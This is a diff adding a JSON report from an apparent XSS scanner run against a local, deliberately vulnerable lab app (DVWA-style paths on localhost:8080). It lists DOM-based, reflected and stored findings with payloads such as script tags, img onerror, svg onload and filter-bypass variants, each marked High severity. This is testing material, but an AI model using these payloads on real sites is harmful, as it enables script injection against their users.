@@ -1,0 +1,202 @@
+[
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_d/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_d/",
+        "method": "get",
+        "xss_type": "DOM-Based XSS",
+        "payload": "#<script>alert('XSS')</script>",
+        "type": "DOM-Based",
+        "evidence": "DOM sink found: 'document\\.write\\s*\\('",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_d/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_d/",
+        "method": "get",
+        "xss_type": "DOM-Based XSS",
+        "payload": "#<img src=x onerror=alert('XSS')>",
+        "type": "DOM-Based",
+        "evidence": "DOM sink found: 'document\\.write\\s*\\('",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<script>alert('XSS')</script>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<img src=x onerror=alert('XSS')>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<svg onload=alert('XSS')>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "\"><script>alert('XSS')</script>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "'><script>alert('XSS')</script>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<img src=x onerror=alert`XSS`>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<body onload=alert('XSS')>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_r/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_r/",
+        "method": "get",
+        "xss_type": "Reflected XSS",
+        "payload": "<iframe src=javascript:alert('XSS')>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<script>alert('XSS')</script>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<img src=x onerror=alert('XSS')>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<svg onload=alert('XSS')>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "\"><script>alert('XSS')</script>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "'><script>alert('XSS')</script>",
+        "type": "Reflected/Stored",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<img src=x onerror=alert`XSS`>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<body onload=alert('XSS')>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    },
+    {
+        "page": "http://localhost:8080/vulnerabilities/xss_s/",
+        "endpoint": "http://localhost:8080/vulnerabilities/xss_s/",
+        "method": "post",
+        "xss_type": "Stored XSS",
+        "payload": "<iframe src=javascript:alert('XSS')>",
+        "type": "Filter-Bypass",
+        "evidence": "Payload found unmodified in response -- script would execute in browser",
+        "severity": "High"
+    }
+]
